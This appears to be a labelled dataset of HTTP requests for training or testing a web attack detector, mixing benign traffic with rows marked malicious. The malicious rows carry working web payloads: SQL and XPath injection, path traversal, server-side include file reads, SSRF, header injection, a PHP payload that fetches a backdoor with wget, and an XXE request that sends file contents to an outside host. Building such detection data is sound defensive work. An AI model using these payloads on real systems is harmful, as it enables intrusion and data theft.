label,text
malicious,"POST /app/user/settings HTTP/1.1
Host: nextgen-ai-platform.dev
X-Forwarded-For: 172.16.254.1%0d%0aInjected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/90.0.4430.212%20Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 38

{""theme"":""dark"",""notifications"":true}"
benign,"PUT /v1/account/settings HTTP/1.1
Host: userprefs.cloud-data-services.ai
Authorization: Bearer mnbvcxzlkjhgfdsa0987654321tokenplus
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Cache-Control: no-cache
Content-Length: 93

{""profile"": {""firstName"": ""John"", ""lastName"": ""Doe"", ""role"": ""user"", ""timezone"": ""America/New_York""}}"
benign,"DELETE /api/v5/articles/54321 HTTP/1.1
Host: blog-content-management.info
Authorization: ApiKey 572f8e0b4a8c4e78b309476c1df67a12
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: application/json
Connection: keep-alive"
malicious,"POST /account/profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Content-Length: 68

username=buyer123&preferences%5Bcurrency%5D=USD&role_id=1&internal_user_status=ACTIVE"
malicious,"POST /contact/send-message HTTP/1.1
Host: client-portal-service.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Length: 107
Referer: https://client-portal-service.info/contact
Connection: keep-alive

message=Thanks+for+the+help!+<?php+echo+shell_exec('wget+http%3A%2F%2Fuplink-boxed.app-shells.biz%2Fbadshell.php+-O+/tmp/backdoor.php');+?>"
benign,"HEAD /media/movies/action-blockbusters/hero-rising-1080p.mkv HTTP/1.1
Host: cinema-world-streams.xyz
User-Agent: Microsoft BITS/7.8
Accept: video/x-matroska,video/*;q=0.9,*/*;q=0.8
Range: bytes=0-0
Connection: close"
malicious,"GET /api/v2/search?query=laptop&filter_evil_chars=true&query=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Referer: https://app.cloud-data-services.ai/home
Connection: keep-alive"
benign,"GET /content/articles/2024-ai-ethics.html HTTP/1.1
Host: digital-thinktank.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Range: bytes=0-1023
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/plain
Accept-Language: en-GB,en;q=0.8
DNT: 1
Connection: keep-alive"
benign,"GET /downloads/reports?file=report-final.pdf HTTP/1.1
Host: docs-archive-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/pdf,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://docs-archive-secure.net/dashboard
Connection: keep-alive"
benign,"GET /v2/api/fetchMetadata?url=https%3A%2F%2Fsecure-user-portal.net%2Fcallback%2Fpayment-success HTTP/1.1
Host: v2.api.secure-user-portal.net
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: https://secure-user-portal.net/dashboard"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: analytics.internal-dashboard.io
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 74

{""reportUrl"":""http://2130706433/admin/dashboard?refresh=true&user=admin""}"
benign,"OPTIONS /api/v1/users/7890 HTTP/1.1
Host: data-secure-api.io
Origin: https://app.client-dashboard.net
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /account/settings/preferences HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Connection: close

newsletter=weekly&communication=email&communication=push"
benign,"GET /api/v3/inventory/items?warehouse_id=14&category=office_supplies&availability=backorder&min_qty=10&max_qty=150&sort=sku_asc&price_min=2.5&price_max=100&include_discontinued=false&page=1&limit=50 HTTP/1.1
Host: warehouse-logistics.io
User-Agent: curl/7.88.1
Accept: application/json
Connection: close"
benign,"PATCH /api/articles/45712 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer a3sdjklas9d8f7wery12
Content-Type: application/merge-patch+json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json
Connection: keep-alive
Content-Length: 44
Referer: https://my-personal-blog-site.info/admin/dashboard

{""title"":""Updated guide to sustainable gardening""}"
malicious,"POST /secure/session/extend HTTP/1.1
Host: cloud-file-sharing.dev
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Referer: https://trusted-client.cloud-file-sharing.dev/premium
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Cookie: session_token=f7dc924ad8f649d9b47f33c92a62c1b6

extend=true&duration=30"
benign,"POST /upload/photos/batch HTTP/1.1
Host: media-archive.devops.ai
Connection: close
Content-Type: multipart/form-data; boundary=----MyCustomBoundary8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Content-Length: 754

------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""mountain_view.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""skyline.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------MyCustomBoundary8--"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json
Accept-Language: en-US,en;q=0.8
Cookie: sessionid=7f2a33d45e3f4c564c779665e8e6e23a; theme=dark;
Content-Type: application/json-patch+json
Content-Length: 73
Connection: keep-alive

[
  {""op"": ""replace"", ""path"": ""/profile/displayName"", ""value"": ""PixelFan42""}
]"
malicious,"GET /reports/2023/summary HTTP/1.1
Host: analytics.enterprise-solutions.co
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache"
benign,"GET /api/v1/user/notifications HTTP/1.1
Host: notify-app-service.tech
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer Zm9vYmFyLmJhei5xdXgifQ.sdf43DS
Origin: https://dashboard.notify-app-service.tech
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
benign,"POST /submit_vote HTTP/1.1
Host: ballot-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Content-Length: 23
Connection: close
Cookie: sessionid=3f97d5a2c1b45e9a7b15

poll_id=89&vote_option=optionA"
benign,"POST /api/upload/photo HTTP/1.1
Host: creative-portfolio-site.dev
Content-Type: multipart/form-data; boundary=----MyBoundary12345
Content-Language: en-US
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: */*
Content-Length: 299
Connection: keep-alive

------MyBoundary12345
Content-Disposition: form-data; name=""title""

Sunset over Lake
------MyBoundary12345
Content-Disposition: form-data; name=""photo""; filename=""sunset.jpg""
Content-Type: image/jpeg

(binary image data not shown)
------MyBoundary12345--"
benign,"PUT /api/settings/general HTTP/1.1
Host: dashboard-admin-panel.pro
If-Match: ""d5f8a237-12af-46af-a7e2-961f4f6b060a""
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46c2VjdXJlcGFzcw==
Accept-Language: en-US,en;q=0.7
User-Agent: Python-urllib/3.10
Content-Length: 48
Connection: close

email_notifications=off&maintenance_mode=enabled&max_login_attempts=5"
benign,"GET /products/home-appliances/search?category=kitchen&filter[power]=high&sort_by=popularity_desc&page=1 HTTP/1.1
Host: smart-living-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Referer: https://smart-living-hub.net/
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /account/profile/save HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: https://my-personal-blog-site.info
User-Agent: Wget/1.20.3 (linux-gnu)
Accept-Encoding: identity
Cache-Control: max-age=0

about=Coder+and+blogger.+<!--#include FiLE=""/var/www/html/.htpasswd""--> Stay tuned!"
benign,"PUT /api/data/item123 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: text/plain
Content-Length: 37
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

Entry update: corrected typo in paragraph."
benign,"OPTIONS /rest/v1/shops/9231 HTTP/1.1
Host: ecommerce-hub360.biz
Origin: https://admin.marketworkflow.store
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Access-Control-Request-Headers: authorization
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v1/invoices/INV-9821.xml HTTP/1.1
Host: finance-ops-solutions.io
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123def456ghi789
Connection: keep-alive"
benign,"GET /community/forum/thread/2025?page=3 HTTP/1.1
Host: devs-connect.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
X-Forwarded-For: 172.16.15.75
Accept-Language: en-GB,en;q=0.5
Connection: close"
benign,"GET /blog/article/view/789?utm_source=param%3DHello%252520World HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.85.0
Accept: */*
Connection: keep-alive"
benign,"GET /static/css/main.css HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /templates/api/v1/submit HTTP/1.1
Host: visual-editor-platform.net
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""87"", ""Google Chrome"";v=""87""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Accept: application/json
Content-Length: 169

{""data"":{""html_snippet"":""<div>Hello</div>"",""debug"":""<!--#exec cmd=\""c""""a""""t /etc/hos""""tname\""-->""}}"
malicious,"POST /user/authenticate HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"POST /login HTTP/1.1
Host: login.cloud-file-storage.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Referer: https://login.cloud-file-storage.net/login
Connection: keep-alive

user=alice.johnson&pass=Saf3Pa$$&redirect_uri=https%3A%2F%2Flogin.cloud-file-storage.net%2Fhome"
malicious,"POST /api/v1/xml_lookup HTTP/1.1
Host: secure-finapp-services.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 131

{""query"": ""/users/user[username='root' and substring(password,8,1)='r']/profile/id""}"
benign,"GET /images/logo.svg HTTP/1.1
Host: digital-marketing-insights.io
User-Agent: python-requests/2.28.2
Accept: image/svg+xml,image/*,*/*;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /blog/article/view/4928 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
X-Forwarded-For: 192.168.0.14
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"PUT /api/v1/users/49182 HTTP/1.1
Host: portal-events-network.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept: application/json
X-CSRF-Token: dGhpcy1pcy1hLXRlc3QtdG9rZW4xMjM0
Content-Length: 70
Connection: close

{""bio"": ""Avid blogger &amp; traveler. I write about &lt;i&gt;tech trends&lt;/i&gt; daily.""}"
benign,"GET /app/control-panel?filter[type]=admin&filter[active]=true HTTP/1.1
Host: vip-access-management.com
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://vip-access-management.com/login
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
malicious,"GET /images/gallery/..%2f..%2f..%2f..%2fwindows/win.ini HTTP/1.1
Host: digital-photo-storage.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Pragma: no-cache"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: data-analytics-hub.cloud
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Accept: */*
Origin: https://data-analytics-hub.cloud
Cookie: sid=2f4c1a9d5cf3bdc043e1a1a2e9d474fb

query=select%20*%20from%20items%20where%20name=%27test%27%0d%0a127.0.0.1%20-%20admin%20%5B10%2FOct%2F2023%3A13%3A55%3A36%20-0700%5D%20%22POST%20%2Fadmin%2Flogin%20HTTP%2F1.1%22%20200%20789"
malicious,"GET /xml_api/search_books?author_id=202%27%20or%20string-length(//users/user[1]/password)%20%3E%205%20or%20%27a%27%3D%27a HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /videos/travel/cuba-2023 HTTP/1.1
Host: visual-storytellers.club
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
malicious,"POST /orders/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.9
Content-Type: application/xml
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Content-Length: 272

<!DOCTYPE orderUpdate [
<!ENTITY % file SYSTEM ""file:///etc/hosts"">
<!ENTITY % dtd SYSTEM ""http://retail-data-exfil.net/config.dtd"">
%dtd;
%send;
]>
<orderUpdate>
  <orderId>4567</orderId>
  <status>shipped</status>
</orderUpdate>"
benign,"GET /stories/sports/championship-finals-2024 HTTP/1.1
Host: competitive-sports-arena.org
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Pragma: no-cache"
benign,"POST /user-data/upload CSV HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/csv
Content-Length: 103
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: sessionid=38af921e4f7d2b619f163d7fbcd12b40; preferences=lang=en-US
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15

username,email,status,signup_date
jane_doe,jane.doe@mailservice.com,active,2023-05-10
mike_88,mike88@example.net,inactive,2022-12-01"
benign,"POST /user/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Connection: keep-alive
Referer: https://api.cloud-data-services.ai/user/settings
Origin: https://api.cloud-data-services.ai
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36

display_name=Jessica+L.+Wong&bio=Data+enthusiast+and+AI+researcher.&website_url=https%3A%2F%2Fjessicalwong.dev&location=Seattle%2C+WA"
